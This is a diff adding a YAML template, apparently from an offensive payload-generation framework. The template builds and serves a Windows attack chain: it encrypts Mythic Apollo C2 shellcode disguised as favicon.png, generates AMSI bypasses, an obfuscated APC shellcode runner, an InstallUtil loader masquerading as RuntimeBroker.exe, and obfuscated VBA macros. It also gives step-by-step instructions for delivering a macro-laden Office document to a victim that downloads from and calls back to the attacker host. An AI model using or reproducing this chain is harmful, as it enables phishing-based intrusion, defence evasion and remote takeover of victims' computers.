@@ -1,0 +1,69 @@
+---
+metadata:
+  filename: "deliver-windows-x64-mythic-apollo-http-shellcode-runner-vba-installutil-apc.yaml"
+  tags: ["shell", "windows", "evasion", "c2"]
+  created: "2026-05-29"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  command -v mcs > /dev/null 2>&1 || printf '%s\n' 'ERROR: mcs (Mono C# compiler) not found' ; \
+  find /opt -name "System.Management.Automation.dll" 2>/dev/null | grep -q . || printf '%s\n' 'ERROR: System.Management.Automation.dll not found or accessible in /opt (PowerShell SDK required)' ; \
+  command -v mcs > /dev/null 2>&1 && \
+  find /opt -name "System.Management.Automation.dll" 2>/dev/null | grep -q . && \
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} && \
+  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png && \
+  rm packstation/outbound/shellcode.bin && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-forceerror.yaml > packstation/outbound/offer3.txt && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-mattgref02.yaml > packstation/outbound/offer4.txt && \
+  python {{ templates_dir }}/helper_scripts/shellcode_runner_generator.py -t apc -d staged --url http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png --xor CA --timing --obfuscate -o packstation/outbound/invoice.txt && \
+  python -c "import base64; open('/tmp/RuntimeBroker.cs','w').write(base64.b64decode('{{ include('payloads/installutil-ps-loader-cs.yaml') | base64 }}').decode())" && \
+  printf '%s\n' 'Compiling RuntimeBroker.exe. Please wait...' && \
+  find /opt -name "System.Management.Automation.dll" 2>/dev/null | head -1 | xargs -I{} mcs /tmp/RuntimeBroker.cs -r:{} -r:System.Configuration.Install -target:exe -sdk:4 -out:packstation/outbound/RuntimeBroker.exe 2>/dev/null && \
+  rm /tmp/RuntimeBroker.cs && \
+  python -c "import base64; open('packstation/outbound/installutil-xmlhttp.vba','w').write(base64.b64decode('{{ include('payloads/installutil-vba-xmlhttp.yaml') | base64 }}').decode())" && \
+  python {{ templates_dir }}/helper_scripts/vba_macro_obfuscator.py packstation/outbound/installutil-xmlhttp.vba -o packstation/outbound/installutil-xmlhttp.vba --seed 1337 --junk 12 && \
+  python -c "import base64; open('packstation/outbound/installutil-bitsadmin.vba','w').write(base64.b64decode('{{ include('payloads/installutil-vba-bitsadmin.yaml') | base64 }}').decode())" && \
+  python {{ templates_dir }}/helper_scripts/vba_macro_obfuscator.py packstation/outbound/installutil-bitsadmin.vba -o packstation/outbound/installutil-bitsadmin.vba --seed 1337 --junk 12 && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                      ------C2 Check------                      ' && \
+  printf '%s\n' 'Ensure Mythic C2 is running at {{ mythic_url }} (callback port: {{ mythic_callback_port }})' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  ' && \
+  printf '%s\n' 'Step 1 - Ensure the target system has installutil.exe installed' && \
+  printf '%s\n' '  Required: .NET Framework 4.0 at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ ' && \
+  printf '%s\n' 'Step 2 - Pick an AMSI bypass and copy it to offer.txt:' && \
+  printf '%s\n' '  offer1.txt (FieldOffset):   cp packstation/outbound/offer1.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' '  offer2.txt (FieldOffset 2): cp packstation/outbound/offer2.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' '  offer3.txt (ForceError):    cp packstation/outbound/offer3.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' '  offer4.txt (MattGref02):    cp packstation/outbound/offer4.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' 'Step 3 - Pick a VBA download variant:' && \
+  printf '%s\n' '  installutil-xmlhttp.vba   -> XMLHTTP/ADODB (in-process, no child process)' && \
+  printf '%s\n' '  installutil-bitsadmin.vba -> bitsadmin via WScript.Shell (spawns cmd.exe)' && \
+  printf '%s\n' 'Step 4 - Start Mythic C2 (see above)' && \
+  printf '%s\n' 'Step 5 - Insert the chosen VBA into an Office document:' && \
+  printf '%s\n' '  Word/Excel -> Developer tab -> Visual Basic -> paste VBA content' && \
+  printf '%s\n' '  Save as .docm (Word) or .xlsm (Excel) with macros enabled' && \
+  printf '%s\n' 'Step 6 - Deliver the Office document to the target' && \
+  printf '%s\n' 'Step 7 - Attack chain on victim open:' && \
+  printf '%s\n' '  AutoOpen -> Runner -> downloads RuntimeBroker.exe from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/RuntimeBroker.exe' && \
+  printf '%s\n' '  -> saves to {{ delivery_path_windows }}\RuntimeBroker.exe' && \
+  printf '%s\n' '  -> installutil.exe /U RuntimeBroker.exe runs Loader.Uninstall()' && \
+  printf '%s\n' '  -> PS runspace 1: IEX offer.txt (chosen AMSI bypass)' && \
+  printf '%s\n' '  -> PS runspace 2: IEX invoice.txt (APC shellcode runner)' && \
+  printf '%s\n' '  -> invoice.txt downloads XOR(0xCA) shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png' && \
+  printf '%s\n' '  -> injects into notepad.exe via Early Bird APC' && \
+  printf '%s\n' '  -> Apollo callback on {{ attacker_ip }}:{{ mythic_callback_port }}' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                  ---Files in packstation---                   ' && \
+  printf '%s\n' '  RuntimeBroker.exe         -> installutil CLM bypass (fetched by VBA)' && \
+  printf '%s\n' '  offer1-4.txt              -> AMSI bypass variants (pick one, cp to offer.txt)' && \
+  printf '%s\n' '  offer.txt                 -> chosen AMSI bypass (IEX by C# runspace)' && \
+  printf '%s\n' '  invoice.txt               -> APC shellcode runner (IEX by C# runspace)' && \
+  printf '%s\n' '  favicon.png               -> XOR(0xCA) Apollo shellcode (fetched by runner)' && \
+  printf '%s\n' '  installutil-xmlhttp.vba   -> obfuscated VBA macro, XMLHTTP/ADODB download' && \
+  printf '%s\n' '  installutil-bitsadmin.vba -> obfuscated VBA macro, bitsadmin download' && \
+  printf '%s\n' '================================================================' && \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
